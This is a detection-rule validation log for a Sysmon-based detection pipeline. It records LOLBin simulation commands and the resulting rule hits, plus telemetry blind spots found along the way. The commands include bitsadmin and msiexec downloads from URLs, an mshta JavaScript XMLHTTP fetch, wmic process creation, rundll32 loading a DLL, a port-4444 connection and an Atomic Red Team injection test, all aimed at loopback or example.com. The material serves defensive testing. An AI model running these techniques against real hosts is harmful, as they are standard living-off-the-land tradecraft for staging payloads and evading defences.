**Notes:** Initial test attempts appeared to produce no hit at all, despite the command running without error and `Get-WinEvent` directly confirming Sysmon logged a fully correct EID 1 process-creation event with the exact expected command line (`odbcconf.exe /a {REGSVR C:\Windows\System32\mshtml.dll}`), which briefly looked like a confirmed engine/rule bug. Root cause was traced to the pipeline (Terminal 1) not actively running/consuming events during that testing window — Sysmon itself was logging correctly the whole time. After confirming the pipeline was live, the identical command line fired the rule correctly, and a repeat of the exact same test also passed. **Operational lesson for the remainder of Phase 4B:** any "no RULE_HIT" result must be cross-checked against direct Sysmon telemetry (`Get-WinEvent`) and pipeline liveness before being logged as a rule FAIL, since a stalled/non-running pipeline produces identical symptoms (silence) to a genuine non-match. **(This lesson was reapplied and further refined in Subphase 4 — see NET_POWERSHELL_HTTP_001 entry below, which uncovered a second variant of this same class of false-FAIL: a full pipeline session restart mid-testing, not just a stall.)**

---

## LOLBIN_CMSTP_001
**Rule name:** CMSTP Execution for UAC Bypass or Code Execution
**Event ID:** 1
**Simulation command:** `cmstp.exe /?`
**Expected pipeline output:** `RULE_HIT | LOLBIN_CMSTP_001`
**Observed result:** PASS
**Actual pipeline output:** `[2026-07-07 22:37:25] RULE_HIT | rule='CMSTP Execution for UAC Bypass or Code Execution' | id=LOLBIN_CMSTP_001 | technique=T1218.003 | tactic=Defense Evasion | severity=High`
**Family enrichment note:** MuddyWater, APT29.
**FP notes:** None.
**Notes:** Fired on any execution of cmstp.exe, as designed — no command-line conditions required.

---

## LOLBIN_HH_CHM_001
**Rule name:** HTML Help Executable Remote or Script Execution
**Event ID:** 1
**Simulation command:** `hh.exe http://127.0.0.1/test.chm`
**Expected pipeline output:** `RULE_HIT | LOLBIN_HH_CHM_001`
**Observed result:** PASS
**Actual pipeline output:** `[2026-07-07 22:49:43] RULE_HIT | rule='HTML Help Executable Remote or Script Execution' | id=LOLBIN_HH_CHM_001 | technique=T1218.001 | tactic=Defense Evasion | severity=High` (fired twice)
**Family enrichment note:** Lazarus Group.
**FP notes:** None.
**Notes:** Clean fire despite the target .chm file not existing; console reported a file-open error but the process creation and URL argument were still captured correctly by Sysmon.

---

## LOLBIN_REGASM_REGSVCS_001
**Rule name:** Regasm or Regsvcs Execution for .NET Assembly Proxy
**Event ID:** 1
**Simulation command:** `& "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe" /?` and `& "...\RegSvcs.exe" /?`
**Expected pipeline output:** `RULE_HIT | LOLBIN_REGASM_REGSVCS_001` (twice, once per binary)
**Observed result:** PASS
**Actual pipeline output:** `[2026-07-07 22:51:27] RULE_HIT | ... image='...RegAsm.exe' ...` and `[2026-07-07 22:51:33] RULE_HIT | ... image='...RegSvcs.exe' ...` (both repeated again at 22:52:14/22:52:16)
**Family enrichment note:** Various APT post-exploitation chains.
**FP notes:** None.
**Notes:** `regasm.exe`/`regsvcs.exe` are not on PATH by default; located at `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\` and invoked via full path. Both binaries fired correctly on any execution, matching filename regardless of path, as designed.

---

## LOLBIN_WMIC_PROCESS_001
**Rule name:** WMIC Remote or Local Process Creation
**Event ID:** 1
**Simulation command:** `wmic process call create "notepad.exe"`
**Expected pipeline output:** `RULE_HIT | LOLBIN_WMIC_PROCESS_001`
**Observed result:** PASS
**Actual pipeline output:** `[2026-07-07 22:49:43] RULE_HIT | rule='WMIC Remote or Local Process Creation' | id=LOLBIN_WMIC_PROCESS_001 | technique=T1047 | tactic=Execution | severity=High`
**Family enrichment note:** APT29, Lazarus, FIN7.
**FP notes:** None.
**Notes:** Clean fire, matched expected rule exactly.

---

## LOLBIN_BITSADMIN_001
**Rule name:** BITSAdmin File Transfer for Payload Staging
**Event ID:** 1
**Simulation command:** `bitsadmin /transfer ShadowSensorTest /download /priority normal http://127.0.0.1/test.txt C:\Temp\test.txt`
**Expected pipeline output:** `RULE_HIT | LOLBIN_BITSADMIN_001`
**Observed result:** PASS
**Actual pipeline output:** `[2026-07-07 22:51:42] RULE_HIT | rule='BITSAdmin File Transfer for Payload Staging' | id=LOLBIN_BITSADMIN_001 | technique=T1197 | tactic=Defense Evasion | severity=Medium`
**Family enrichment note:** APT10, APT33.
**FP notes:** None.
**Notes:** Transfer was cancelled (no server at 127.0.0.1) but EID 1 still captured the command line at process creation, as expected.

---

## LOLBIN_INSTALLUTIL_001
**Rule name:** InstallUtil AppControl Bypass Execution
**Event ID:** 1
**Simulation command:** `& "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe" /?`
**Expected pipeline output:** `RULE_HIT | LOLBIN_INSTALLUTIL_001`
**Observed result:** PASS
**Actual pipeline output:** `[2026-07-07 22:54:12] RULE_HIT | rule='InstallUtil AppControl Bypass Execution' | id=LOLBIN_INSTALLUTIL_001 | technique=T1218.004 | tactic=Defense Evasion | severity=High`
**Family enrichment note:** Red team tooling, various APT.
**FP notes:** None.
**Notes:** Matched on filename regardless of path, as designed.

---

## LOLBIN_FORFILES_001
**Rule name:** Forfiles Executing Arbitrary Commands via Shell Spawn
**Event ID:** 1
**Simulation command:** `forfiles /p C:\Windows\System32 /m notepad.exe /c "cmd /c echo Phase 4B forfiles simulation"`
**Expected pipeline output:** `RULE_HIT | LOLBIN_FORFILES_001`
**Observed result:** PASS
**Actual pipeline output:** `[2026-07-07 22:52:32] RULE_HIT | rule='Forfiles Executing Arbitrary Commands via Shell Spawn' | id=LOLBIN_FORFILES_001 | technique=T1216 | tactic=Defense Evasion | severity=Medium`
**Family enrichment note:** Commodity downloaders.
**FP notes:** None.
**Notes:** Clean fire, matched expected rule exactly.

---

## NET_POWERSHELL_HTTP_001
**Rule name:** PowerShell Outbound Network Connection
**Event ID:** 3
**Simulation command:** Initially `vm_tp_test_03_chains_api_network.ps1` (PowerShell outbound TCP :443 block); then, after that run produced no clean isolated confirmation, a dedicated command: `$c = New-Object Net.Sockets.TcpClient; $c.Connect('example.com', 443)`
**Expected pipeline output:** `RULE_HIT | NET_POWERSHELL_HTTP_001`
**Observed result:** PASS (confirmed after multi-step investigation)
**Actual pipeline output:** `[2026-07-09 22:18:57] RULE_HIT | rule='PowerShell Outbound Network Connection' | id=NET_POWERSHELL_HTTP_001 | technique=T1071.001 | tactic=Command and Control | severity=High | image='...powershell.exe' | dest='-:443'`
**Family enrichment note:** Emotet, general commodity loaders.
**FP notes:** None.
**Notes:** This rule required the most extensive troubleshooting in Subphase 4 and produced two important, generalizable findings for the environment/methodology:
1. **Loopback connections are invisible to Sysmon EID 3 in this environment.** All initial Subphase 4 network simulations targeted `127.0.0.1`. `Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=3}` showed 115 total EID 3 events in the relevant window, none of them against `127.0.0.1` — all were real external-IP traffic from background processes (explorer.exe, svchost.exe, MsMpEng.exe, msedgewebview2.exe). Re-targeting simulations at `example.com` (IANA-reserved for testing, safe, and reachable — confirmed via `.Connect()` returning `Connected: True`) resolved this for TCP-based tests.
2. **A pipeline session restart occurred mid-troubleshooting** (`rule_hits.log` shows `=== SESSION END ===` at 22:16:34 and `=== SESSION START ===` at 22:18:35), which silently swallowed the immediately-preceding `example.com` connection attempt and a `wscript.exe` HTTP test — both looked like rule failures but were actually lost to pipeline downtime. The very next test after the restart (an identical `TcpClient.Connect('example.com', 443)`) fired the rule cleanly at 22:18:57. This is a second, distinct variant of the Subphase 3 "stalled pipeline" operational lesson — this time a full session boundary, not just a stall — and reinforces the existing mitigation (always check `rule_hits.log` for `SESSION END`/`SESSION START` markers bracketing a test before concluding a rule failed to fire).
**Conclusion:** rule logic is correct and confirmed; both false negatives up to this point were environmental/operational, not rule defects.

---

## NET_SCRIPTING_ENGINE_HTTP_001
**Rule name:** Script Host (wscript/cscript) Outbound HTTP Connection
**Event ID:** 3
**Simulation command:**
```powershell
$vbs = @"
Dim http
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", "http://example.com/", False
On Error Resume Next
http.Send
"@
$vbs | Out-File -FilePath "C:\Temp\test_net_4b_v3.vbs" -Encoding ASCII
wscript.exe C:\Temp\test_net_4b_v3.vbs
```
(Run three times total across the subphase — once against 127.0.0.1, twice against example.com — with confirmed pipeline liveness bracketing the final attempt via `rule_hits.log` tail before and after.)
**Expected pipeline output:** `RULE_HIT | NET_SCRIPTING_ENGINE_HTTP_001`
**Observed result:** PARTIAL — environment-limited (confirmed), not a rule/pipeline defect
**Actual pipeline output:** No hit on any of the three attempts, including the final one where the pipeline was confirmed alive immediately before and after (via `rule_hits.log -Tail`, which showed the unrelated `NET_POWERSHELL_HTTP_001` hit at 22:18:57 directly preceding this test with no session boundary in between).
**Family enrichment note:** Emotet, QBot (wscript outbound HTTP download pattern).
**FP notes:** None — this is an under-detection (false negative at the telemetry layer), not an over-detection.
**Notes:** Root cause isolated via direct Sysmon telemetry inspection: `Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=3} -MaxEvents 5` immediately after the test showed zero EID 3 events attributable to `wscript.exe` at any point in the test window — the most recent EID 3 events belonged to unrelated background processes (`backgroundTaskHost.exe`, `svchost.exe`). This means **Sysmon's network-connection hook never captured wscript's `MSXML2.XMLHTTP` COM object's connection at all**, despite the request targeting port 443 (a port the Sysmon config's EID 3 `include` filter does capture) and despite the destination being reachable (confirmed working for the PowerShell TcpClient test moments earlier). The most likely explanation: `MSXML2.XMLHTTP` (and IE's WinINet stack more broadly) may route HTTP requests through a different network code path (WinINet / a COM surrogate process, or a session-level proxy) than a direct socket call, which may not be visible to Sysmon's WFP-based network hook in the same way a raw `Net.Sockets.TcpClient` call or a native LOLBin socket call is. **This same underlying limitation was also independently observed for `LOLBIN_MSHTA_001`'s network-layer sibling rule (`NET_LOLBIN_PROCESS_HTTP_001` via mshta.exe — see that entry) — both use the same `MSXML2.XMLHTTP`/ActiveXObject mechanism, strengthening the case that this is a COM/WinINet-specific Sysmon blind spot rather than two unrelated one-off issues.** No Codex action required — this is not a fixable rule-logic issue, since there is no event for the rule engine to evaluate. Recommend documenting as a Section 2 (Telemetry Design) research finding: Sysmon EID 3 has a demonstrated blind spot for COM/WinINet-mediated HTTP requests (ActiveXObject/MSXML2.XMLHTTP), a mechanism used by multiple real fileless-malware families (see family enrichment note) — meaning a rule-based detector relying solely on EID 3 will systematically miss this technique regardless of rule quality, and would need a complementary detection mechanism (e.g., ETW WinINet provider, or correlating on the parent EID 1 process + absence of expected EID 3, or DLL/COM activity monitoring) to close this gap in a production tool.

---

## NET_LOLBIN_PROCESS_HTTP_001
**Rule name:** LOLBin or Command Shell Outbound HTTP Connection
**Event ID:** 3
**Simulation command:** Primary (per task spec): `mshta.exe "javascript:var x=new ActiveXObject('MSXML2.XMLHTTP');x.open('GET','http://127.0.0.1/',false);try{x.send();}catch(e){}close();"` (and repeated against `http://example.com/`); confirmatory: `msiexec.exe /i http://example.com/test.msi /q`
**Expected pipeline output:** `RULE_HIT | NET_LOLBIN_PROCESS_HTTP_001`
**Observed result:** PASS (via msiexec.exe) — mshta.exe variant separately confirmed environment-limited
**Actual pipeline output:**
- mshta.exe (both 127.0.0.1 and example.com variants): no hit, and `LOLBIN_MSHTA_001` (EID 1) fired correctly both times but no corresponding EID 3 event appeared in `Get-WinEvent` filtered/matched for `mshta` at all
- msiexec.exe (example.com): `[2026-07-09 21:59:25] RULE_HIT | rule='LOLBin or Command Shell Outbound HTTP Connection' | id=NET_LOLBIN_PROCESS_HTTP_001 | technique=T1071.001 | tactic=Command and Control | severity=High | image='...msiexec.exe' | dest='-:80'` (fired twice, 21:59:25 and 21:59:29, across two separate test runs)
**Family enrichment note:** Various commodity loaders using LOLBins as download-and-execute proxies.
**FP notes:** None.
**Notes:** This rule's mshta.exe path shares the exact same root cause as `NET_SCRIPTING_ENGINE_HTTP_001` above: mshta's JavaScript-invoked `ActiveXObject('MSXML2.XMLHTTP')` call is COM/WinINet-mediated and does not generate a Sysmon EID 3 event, confirmed via a dedicated diagnostic query (`Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=3} -MaxEvents 10 | Where-Object {$_.Message -match 'mshta'}` returned empty). However, the msiexec.exe path for this exact same rule fired cleanly and correctly, proving the **rule's logic and LOLBin-matching conditions are fully correct** — the gap is specific to the mshta simulation technique (a Sysmon telemetry blind spot for that particular API surface), not the rule itself. **PASS is recorded on the strength of the msiexec.exe confirmation; the mshta.exe path is logged as a known simulation/telemetry limitation for this rule, matching the sibling note under NET_SCRIPTING_ENGINE_HTTP_001.** No Codex action required.

---

## NET_SUSPICIOUS_PORT_001
**Rule name:** Outbound Connection to Suspicious/Non-Standard Port
**Event ID:** 3
**Simulation command:** `powershell -NoProfile -Command "try { $c = New-Object Net.Sockets.TcpClient; $c.Connect('127.0.0.1', 4444) } catch { }"`
**Expected pipeline output:** `RULE_HIT | NET_SUSPICIOUS_PORT_001`
**Observed result:** PARTIAL — environment-limited (confirmed), not a rule/pipeline defect
**Actual pipeline output:** No hit.
**Family enrichment note:** Metasploit (port 4444 default reverse shell listener), various RATs.
**FP notes:** None.
**Notes:** Root cause confirmed directly from the locked Sysmon config itself (`C:\sysmon\sysmonconfig-export.xml`, lines 260–275): the EID 3 (NetworkConnect) section uses an explicit `onmatch="include"` filter restricted to exactly two ports:
```xml
<NetworkConnect onmatch="include">
    <DestinationPort condition="is">80</DestinationPort>
    <DestinationPort condition="is">443</DestinationPort>
</NetworkConnect>
```
The config's own inline comment explicitly states this is deliberate: *"By default this configuration takes a very conservative approach to network logging, limited to only extremely high-signal events."* This means Sysmon will **never** generate an EID 3 event for a connection to port 4444 (or any port other than 80/443) regardless of rule logic — the event simply does not exist for the rule engine to evaluate. This is a genuine, confirmed environment/telemetry-design limitation, not a bug in `NET_SUSPICIOUS_PORT_001`'s YAML condition. **No Codex action required** — fixing this would require either (a) widening the Sysmon config's EID 3 include filter to capture additional high-risk ports (4444, 1337, 8888, 9999, 31337, etc.) explicitly, which is out of scope for Phase 4B since the config is locked, or (b) accepting this as a documented, deliberate telemetry trade-off. Recommend flagging as a Section 2 (Telemetry Design) research finding: a conservative Sysmon EID 3 posture, while reducing log volume, creates a structural blind spot for exactly the kind of non-standard-port C2 traffic this rule was designed to catch — a real, citable limitation of the current environment. Consider recommending (for a future phase, not Phase 4B) an explicit widening of the sysmonconfig's NetworkConnect include list to add ports historically associated with common C2 frameworks, if network-layer detection quality is prioritized over log volume in a future iteration.

---

## NET_LOLBIN_NETWORK_001
**Rule name:** High-Risk LOLBin Making Any Outbound Network Connection
**Event ID:** 3
**Simulation command:** `msiexec.exe /i http://example.com/test.msi /q` (127.0.0.1 variant tried first, produced no hit; example.com variant succeeded)
**Expected pipeline output:** `RULE_HIT | NET_LOLBIN_NETWORK_001`
**Observed result:** PASS
**Actual pipeline output:** `[2026-07-09 21:59:25] RULE_HIT | rule='High-Risk LOLBin Making Any Outbound Network Connection' | id=NET_LOLBIN_NETWORK_001 | technique=T1105 | tactic=Command and Control | severity=High | image='...msiexec.exe' | dest='-:80'` (fired twice, 21:59:25 and 21:59:29)
**Family enrichment note:** Various APT campaigns using LOLBin-initiated outbound connections as a network-layer indicator.
**FP notes:** None.
**Notes:** Confirms the same loopback-blind-spot pattern documented under `NET_POWERSHELL_HTTP_001` — the 127.0.0.1 attempt produced no EID 3 event at all (per the broader 115-event EID 3 audit covering this window), while the identical simulation against `example.com` fired cleanly. Rule logic confirmed correct; earlier apparent failure was a simulation-target artifact, not a defect.

---

## NET_SMB_LATERAL_001
**Rule name:** Non-System Process Initiating SMB Outbound Connection
**Event ID:** 3
**Simulation command:** `powershell -NoProfile -Command "try { $c = New-Object Net.Sockets.TcpClient; $c.Connect('127.0.0.1', 445) } catch { }"`
**Expected pipeline output:** `RULE_HIT | NET_SMB_LATERAL_001`
**Observed result:** PARTIAL — environment-limited (confirmed), not a rule/pipeline defect
**Actual pipeline output:** No hit.
**Family enrichment note:** APT29, Emotet lateral movement (Pass-the-Hash/SMB relay).
**FP notes:** None.
**Notes:** Same root cause as `NET_SUSPICIOUS_PORT_001` above — Sysmon's locked EID 3 `include` filter (`sysmonconfig-export.xml` lines 271–274) only captures ports 80 and 443. Port 445 traffic is never logged by Sysmon in this environment, regardless of rule correctness. Confirmed via the same config inspection used for the port-4444 rule. **No Codex action required** — this is a telemetry-layer limitation, not a rule defect. Same Section 2 research recommendation applies: widening the Sysmon EID 3 include list (in a future phase) would be required to exercise or rely on this rule in practice; as currently configured, `NET_SMB_LATERAL_001` cannot fire under any circumstance, which is worth explicitly noting as a known coverage gap in the tool's current default configuration.

---

## NET_DNS_LONG_QUERY_001
**Rule name:** Unusually Long DNS Query Indicating Potential DNS Tunneling
**Event ID:** 22
**Simulation command:** `powershell -NoProfile -Command "try { Resolve-DnsName 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.example.com' } catch { }"` (57-character hostname label, above the rule's 50-char threshold)
**Expected pipeline output:** `RULE_HIT | NET_DNS_LONG_QUERY_001`
**Observed result:** PASS (genuine, dedicated-trigger confirmation) — distinct from the pre-existing provisional FP noted against SearchApp.exe
**Actual pipeline output:** `[2026-07-09 21:44:20] RULE_HIT | rule='Unusually Long DNS Query Indicating Potential DNS Tunneling' | id=NET_DNS_LONG_QUERY_001 | technique=T1071.004 | tactic=Command and Control | severity=Medium | image='...powershell.exe'`
**Family enrichment note:** Iodine (DNS tunneling), DNScat2.
**FP notes:** This rule has an existing **unresolved, separately-tracked provisional false positive** on `SearchApp.exe` (Windows Search), first observed in Subphases 2–3 with no corresponding test activity, still pending confirmation via the formal Subphase 7 benign baseline (see Cross-Cutting Issue 3). The result logged here is a **separate, genuine, deliberately-triggered positive detection** on a real long-hostname query from `powershell.exe` — the two observations are not in conflict; the rule appears to correctly detect genuine long-hostname patterns while *also* separately over-firing on `SearchApp.exe` under conditions not yet fully characterized. Both facts should be carried into the Subphase 7 baseline write-up and the eventual Codex fix (Issue 3) so the fix addresses the SearchApp.exe FP specifically without weakening the confirmed-working detection demonstrated here.
**Notes:** Clean, unambiguous fire on the deliberate 57-character test hostname, correctly attributed to `powershell.exe`. Confirms rule detection logic and length threshold are working exactly as designed for genuine long-hostname queries.

**Subphase 7 addendum — Issue 3 finalization (formal benign baseline):**
**Actual pipeline output (Subphase 7):** `[2026-07-12 23:00:19] RULE_HIT | rule='Unusually Long DNS Query Indicating Potential DNS Tunneling' | id=NET_DNS_LONG_QUERY_001 | technique=T1071.004 | tactic=Command and Control | severity=Medium | image='C:\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe'`
**Query name confirmed via direct Sysmon telemetry:** `b59dd060c31a5268a4dd55e6dc581400.azr.footprintdns.com` (53 characters). The leading 32-character segment is a hex/MD5-shaped identifier; `footprintdns.com` is a legitimate Microsoft Azure telemetry domain associated with Windows Connected Experiences / network-quality telemetry. This fired during the clean Subphase 7 benign baseline session (`22:49:29`–`23:07:35`), moments after Ayush typed "powershell" into the Windows taskbar search box to launch PowerShell — the long query itself is Windows Search's own background telemetry lookup, not anything typed by the user (the literal typed text, "powershell," is nowhere near the 50-character threshold).
**Finalization:** This is the **third independent, test-activity-free occurrence** of this exact pattern (Subphases 2–3, now this formal clean baseline), each time with no adversarial trigger present. **Issue 3 is now CONFIRMED, not provisional — upgraded from "pending Subphase 7 baseline" to ACTION REQUIRED: Route to Codex** (see updated Cross-Cutting Issue 3 below for the exact fix routing). This is also a legitimate, citable Section 2 (Telemetry Design) research finding: a genuine, benign Microsoft telemetry domain naturally produces hash-shaped, 50+ character subdomains — structurally indistinguishable by length alone from DNS-tunneling-tool output (Iodine, DNScat2), demonstrating a real weakness in length-threshold-only DNS-tunneling heuristics. This finding does not change or weaken the confirmed-genuine PowerShell long-hostname detection documented above from Subphase 4 — both facts stand independently.

---

## NET_DNS_SCRIPT_ENGINE_001
**Rule name:** Script Host (wscript/cscript/mshta) DNS Query
**Event ID:** 22
**Simulation command:**
```powershell
$vbs = @"
Dim http
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", "http://shadowsensortest4b.nonexistent.local/", False
On Error Resume Next
http.Send
"@
$vbs | Out-File -FilePath "C:\Temp\test_dns_4b_v2.vbs" -Encoding ASCII
wscript.exe C:\Temp\test_dns_4b_v2.vbs
```
**Expected pipeline output:** `RULE_HIT | NET_DNS_SCRIPT_ENGINE_001`
**Observed result:** FAIL — CONFIRMED BUG, route to Codex
**Actual pipeline output:** No hit. Pipeline confirmed alive throughout (verified via `rule_hits.log -Tail` showing no session boundary around the test window).
**Family enrichment note:** Commodity script-based loaders contacting C2 infrastructure via script-host DNS resolution.
**FP notes:** N/A — this is a false negative (under-detection), not an over-detection.
**Notes:** **This is a genuine, confirmed rule/normalizer bug, unlike the sibling HTTP-layer rules above.** Direct Sysmon telemetry inspection (`Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=22} -MaxEvents 5`) showed that Sysmon **did** generate a real, correctly-timed EID 22 event for this exact test:
```
TimeCreated : 7/9/2026 10:22:45 PM
QueryName: shadowsensortest4b.nonexistent.local
QueryStatus: 9003
ProcessGuid: {00000000-0000-0000-0000-000000000000}
ProcessId: 2720
Image: <unknown process>
```
The query name, timing, and process ID all match the test exactly — the event genuinely exists. However, both `Image` and `ProcessGuid` are unresolved (`<unknown process>` / all-zero GUID), meaning the rule engine had no usable process-name field to match `wscript.exe`/`cscript.exe`/`mshta.exe` against, so it correctly failed to fire *given the malformed data it received*. **The bug is therefore in the normalizer's PID→image resolution for this event/process context, not in the rule's YAML condition itself.**
**Notably, this is the same failure signature (`<unknown process>`, unresolved GUID) already seen and flagged in Subphase 2/3 for `API_CREATE_REMOTE_THREAD_001`'s `target` field** — see Cross-Cutting Issue 2. Both involve short-lived or indirectly-spawned process contexts (a COM-mediated network call in this case; a blocked/killed process launch in the CreateRemoteThread case) where the normalizer's process-lookup appears to run either too late (after the source process has already exited/changed state) or against a PID that was never cleanly bound to a ProcessGuid at the time Sysmon logged the event. **Recommend Codex investigate this as a single shared root-cause normalizer defect potentially affecting multiple event types (EID 8 and EID 22 confirmed so far; EID 10 not yet ruled out) rather than as two unrelated one-off bugs** — see Cross-Cutting Issue 6 below for the consolidated Codex routing.

---

## API_OPEN_PROCESS_SUSPICIOUS_ACCESS_001 (re-validation)
**Rule name:** Suspicious OpenProcess targeting security-sensitive process
**Event ID:** 10
**Simulation command:** `powershell -ExecutionPolicy Bypass -File scripts\vm_tp_test_03_chains_api_network.ps1`
**Expected pipeline output:** `RULE_HIT | API_OPEN_PROCESS_SUSPICIOUS_ACCESS_001`
**Observed result:** PASS
**Actual pipeline output:** Fired as part of the standard Part 3 script run alongside the other expected chain/API hits for this subphase.
**Family enrichment note:** Mimikatz, credential dumping tools.
**FP notes:** The Issue 4 pattern (`wmiprvse.exe → winlogon.exe/lsass.exe`) was not observed in this specific re-test window. However, a completely independent, later pipeline session (2026-07-12, outside formal Subphase 5 testing but captured incidentally) showed this same rule firing twice with `svchost.exe` — not `wmiprvse.exe` — as the source process, against the same target set (`winlogon.exe`, `lsass.exe`), with zero WMI activity anywhere in that session. See the Issue 4 update in Cross-Cutting Issues below — this new data point shifts the working theory away from "WMI provider housekeeping" toward "genuine FP surface, source-process-agnostic."
**Notes:** Re-validation confirms the rule's core detection logic (target-centric lsass/winlogon/csrss matching, hardened in Phase 2B) is intact and firing correctly on the expected script-driven trigger.

---

## API_CREATE_REMOTE_THREAD_001 (Subphase 5 — deferred EID 8 validation)
**Rule name:** CreateRemoteThread Detected
**Event ID:** 8
**Simulation command:**
```powershell
Import-Module Invoke-AtomicRedTeam
Invoke-AtomicTest T1055.003 -TestNumbers 1
Invoke-AtomicTest T1055.003 -TestNumbers 1 -Cleanup
```
Also incidentally re-fired via the built-in "CreateRemoteThread cross-image" test inside `vm_tp_test_03_chains_api_network.ps1`, run in the same window.
**Expected pipeline output:** `RULE_HIT | API_CREATE_REMOTE_THREAD_001`
**Observed result:** PASS (confirmed via script's own built-in test) + PARTIAL — Defender interference (Atomic T1055.003 specifically blocked)
**Actual pipeline output:**
- `[2026-07-09 23:28:38] RULE_HIT | ... image='...python_runtime\python.exe' ... target='<unknown process>'` — this occurred *before* the Atomic test ran, during the script's own CRT test; source is the pipeline's own runtime process (see Issue 2 update below — second confirmed occurrence of this specific anomaly)
- `[2026-07-09 23:28:52] RULE_HIT | ... image='...powershell.exe' ... target='C:\Windows\System32\notepad.exe'` — clean, fully-resolved hit, 4 seconds after the script's incidental `ss_crt_test.ps1` launch; this is the genuine confirming PASS for this rule
- Atomic T1055.003 itself: `Start-Process : This command cannot be run due to the error: Operation did not complete successfully because the file contains a virus or potentially unwanted software.` — `InjectContext.exe` blocked outright by Defender before executing. Cleanup ran without error, but no injection technique actually fired.
**Family enrichment note:** Cobalt Strike, Metasploit (CreateRemoteThread injection).
**FP notes:** See Issue 2 (persistent FP, target-resolution bug) — this session added a second confirmed recurrence of the `python.exe`-sourced `<unknown process>` anomaly, reinforcing that this is a standalone normalizer bug independent of any deliberate injection technique, not something Atomic T1055.003 would have "closed out" even if Defender hadn't blocked it.
**Notes:** The deferred EID 8 validation goal is met via the script's own built-in cross-image CreateRemoteThread test (clean powershell.exe→notepad.exe hit), not via the Atomic Red Team test as originally planned — Defender's signature-based block on `InjectContext.exe` is the same class of interference already documented for `PS_AMSI_BYPASS_001`/`PS_CREDENTIAL_ACCESS_001`/`LOLBIN_RUNDLL32_SUSPICIOUS_001`/`LOLBIN_REGSVR32_001`. Rule logic is confirmed sound; the specific Atomic technique for T1055.003 could not be exercised in this environment due to AV competition, not a rule defect.

**Subphase 7 addendum — Issue 2, 5th confirmed occurrence (benign baseline, no deliberate technique):**
**Actual pipeline output:** `[2026-07-12 22:55:59] RULE_HIT | rule='CreateRemoteThread Detected' | id=API_CREATE_REMOTE_THREAD_001 | technique=T1055 | tactic=Defense Evasion | severity=Critical | image='C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe' | target='C:\Windows\System32\msdt.exe'`
**Context:** Occurred during ordinary Edge open/close activity within the clean Subphase 7 benign baseline session — no deliberate injection technique, no test script running.
**Verification:** Directly confirmed via `Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=1; StartTime=(Get-Date "2026-07-12 22:55:40"); EndTime=(Get-Date "2026-07-12 22:56:20")}` that **`msdt.exe` never existed as a live process at any point in that window** — every EID 1 event in the bracket was `msedge.exe`, `SecurityHealthHost.exe`, or `elevation_service.exe`.
**Significance:** This is the **5th confirmed occurrence** of the Issue 2 pattern, and introduces a new evidentiary detail: unlike prior occurrences that resolved `target` to a blank `<unknown process>`, this one resolved to a **specific, plausible-looking, but confirmed-nonexistent process name**. This strengthens the "stale/incorrectly-cached process-table lookup" theory over a pure race-condition-only explanation, since the normalizer produced a concrete wrong answer rather than an empty one. See updated Cross-Cutting Issue 2 below. No change to Codex routing status — already flagged.

---

## API_DLL_LOAD_SUSPICIOUS_PATH_001
**Rule name:** Unsigned DLL Loaded From User-Writable Path
**Event ID:** 7
**Simulation command:**
```powershell
$code = @"
using System;
public class Phase4BTest {
    public static void Run() { Console.WriteLine("Phase 4B DLL load simulation"); }
}
"@
Add-Type -TypeDefinition $code -OutputAssembly "C:\Users\Public\phase4b_test.dll" -OutputType Library

[System.Reflection.Assembly]::LoadFile("C:\Users\Public\phase4b_test.dll")
```
**Expected pipeline output:** `RULE_HIT | API_DLL_LOAD_SUSPICIOUS_PATH_001`
**Observed result:** ENVIRONMENT-LIMITED — confirmed, not a rule/pipeline defect
**Actual pipeline output:** No hit. Confirmed via a full, unfiltered audit of every EID 7 event in the 23:28:30–23:33:00 test window (dozens of entries covering `powershell.exe`'s complete DLL-load sequence for this exact `LoadFile()` call) — `phase4b_test.dll` never appears as an `ImageLoaded` value anywhere in the window.
**Family enrichment note:** PowerSploit (Invoke-ReflectivePEInjection), Cobalt Strike reflective DLL loading.
**FP notes:** N/A — this is an under-detection (false negative at the telemetry layer), not an over-detection.
**Notes:** Root cause: the test DLL is a **pure-IL (Intermediate Language) managed .NET assembly**, produced by PowerShell's `Add-Type -OutputType Library`. `.NET`'s `Assembly.LoadFile()` for a pure-IL assembly is a CLR-managed operation — the runtime reads and JITs the assembly's bytes without necessarily invoking the native Win32 `LoadLibrary` code path that Sysmon's kernel-level ImageLoad hook observes. This is a well-documented category of managed-code blind spot for native-telemetry tooling, not specific to this rule or this environment's Sysmon config. **No Codex action required** — the rule's YAML condition (unsigned DLL + user-writable path substring match) was never actually exercised against a genuine qualifying event, so nothing about its logic has been disproven. A true test of this rule would require a **native, non-managed** DLL (e.g., compiled via a native C/C++ toolchain), which was not available in this environment. Recommend documenting as a Section 2 (Telemetry Design) research finding: Sysmon's ImageLoad hook does not reliably capture managed/pure-IL .NET assembly loads via `Assembly.LoadFile()`, a gap relevant to any detection strategy targeting reflective/in-memory .NET loading techniques (e.g., PowerSploit's `Invoke-ReflectivePEInjection`).

---

## API_LOLBIN_DLL_UNSIGNED_001
**Rule name:** LOLBin Loading Unsigned DLL
**Event ID:** 7
**Simulation command:** `rundll32.exe C:\Users\Public\phase4b_test.dll,Run` (using the same test DLL created for `API_DLL_LOAD_SUSPICIOUS_PATH_001` above)
**Expected pipeline output:** `RULE_HIT | API_LOLBIN_DLL_UNSIGNED_001` (and likely `API_DLL_LOAD_SUSPICIOUS_PATH_001` as a co-fire)
**Observed result:** ENVIRONMENT-LIMITED — confirmed, not a rule/pipeline defect
